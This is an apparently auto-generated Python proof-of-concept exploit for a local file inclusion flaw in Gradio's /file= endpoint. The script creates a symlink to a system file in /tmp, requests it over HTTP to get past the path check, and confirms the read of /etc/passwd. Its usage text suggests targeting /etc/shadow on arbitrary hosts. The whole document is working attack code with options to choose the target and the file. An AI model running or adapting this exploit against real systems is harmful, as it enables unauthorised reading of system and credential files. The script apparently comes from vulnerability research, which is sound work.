#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: lfi-000
# Sink: file
# Auto-generated — run with: python3 lfi_however_validation_uses_utils_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Gradio LFI via symlink bypass.

Vulnerability: The /file= endpoint validates paths using os.path.abspath() which
does NOT resolve symlinks. If an attacker can create a symlink inside an allowed
directory (e.g., via file upload or misconfigured allowed_paths), the symlink's
path passes validation, but FileResponse follows the symlink to read arbitrary files.

This PoC:
1. Creates a benign symlink inside the app directory pointing to /etc/passwd
2. Requests the file via the /file= endpoint
3. Demonstrates the bypass by reading the target file

Requirements: Python 3.6+, requests library (stdlib urllib also works)
"""

import os
import sys
import tempfile
import urllib.request
import urllib.error
import argparse

def create_symlink_in_app_dir(target_path: str, link_name: str) -> str:
    """
    Create a symlink inside a temporary directory that mimics an allowed path.
    In a real attack, the attacker would upload a file that is a symlink,
    or the app's allowed_paths would include a directory where the attacker
    can write.
    
    For this PoC, we create a symlink in /tmp pointing to the target file.
    We assume /tmp is in allowed_paths (common in Gradio apps).
    """
    link_path = os.path.join(tempfile.gettempdir(), link_name)
    if os.path.exists(link_path):
        os.remove(link_path)
    os.symlink(target_path, link_path)
    print(f"[+] Created symlink: {link_path} -> {target_path}")
    return link_path

def exploit(target_url: str, symlink_name: str) -> None:
    """
    Exploit the LFI by requesting the symlink via the /file= endpoint.
    """
    # Construct the URL to the symlink
    # The symlink is in /tmp, which is typically in allowed_paths
    file_url = f"{target_url.rstrip('/')}/file={symlink_name}"
    
    print(f"[*] Requesting: {file_url}")
    
    try:
        # Use urllib for stdlib-only approach
        req = urllib.request.Request(file_url)
        with urllib.request.urlopen(req, timeout=10) as response:
            content = response.read()
            print(f"[+] Success! Status: {response.status}")
            print(f"[+] Response length: {len(content)} bytes")
            print(f"[+] Content preview:\n{content[:500].decode('utf-8', errors='replace')}")
            
            # Verify we got the target file content
            if b"root:" in content:
                print("[!] Confirmed: Read /etc/passwd via symlink bypass!")
            else:
                print("[?] Response received but doesn't match expected content.")
                
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        if e.code == 403:
            print("[!] Access denied - symlink may not be in allowed path")
        elif e.code == 404:
            print("[!] File not found - symlink may not exist")
        else:
            print(f"[-] Response body: {e.read()[:200]}")
    except urllib.error.URLError as e:
        print(f"[-] URL Error: {e.reason}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

def cleanup(symlink_path: str) -> None:
    """Remove the symlink after exploitation."""
    if os.path.islink(symlink_path):
        os.remove(symlink_path)
        print(f"[+] Cleaned up symlink: {symlink_path}")

def main():
    parser = argparse.ArgumentParser(
        description="Gradio LFI Symlink Bypass PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
  python3 gradio_lfi_poc.py --target http://localhost:7860
  python3 gradio_lfi_poc.py --target http://example.com:7860 --target-file /etc/shadow
        """
    )
    parser.add_argument(
        "--target",
        default="http://localhost:7860",
        help="Target Gradio app URL (default: http://localhost:7860)"
    )
    parser.add_argument(
        "--target-file",
        default="/etc/passwd",
        help="File to read via symlink (default: /etc/passwd)"
    )
    parser.add_argument(
        "--symlink-name",
        default="poc_symlink.txt",
        help="Name of the symlink file (default: poc_symlink.txt)"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't remove the symlink after exploitation"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Gradio LFI Symlink Bypass - Proof of Concept")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Target file: {args.target_file}")
    print(f"[*] Symlink name: {args.symlink_name}")
    print()
    
    # Step 1: Create the symlink
    symlink_path = create_symlink_in_app_dir(args.target_file, args.symlink_name)
    
    # Step 2: Exploit
    exploit(args.target, args.symlink_name)
    
    # Step 3: Cleanup
    if not args.no_cleanup:
        cleanup(symlink_path)
    else:
        print(f"[*] Symlink left at: {symlink_path}")

if __name__ == "__main__":
    main()
